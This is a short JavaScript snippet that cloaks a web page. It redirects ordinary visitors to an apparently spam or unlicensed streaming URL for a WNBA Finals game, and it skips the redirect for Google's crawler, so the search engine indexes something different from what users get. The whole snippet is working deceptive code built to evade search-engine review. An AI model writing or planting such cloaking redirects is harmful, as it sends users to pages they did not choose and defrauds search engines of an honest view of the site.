// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://sportsmasters.live/WNBA/?m=WNBA%20Finals%202026%20Valkyries%20vs%20Dream";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
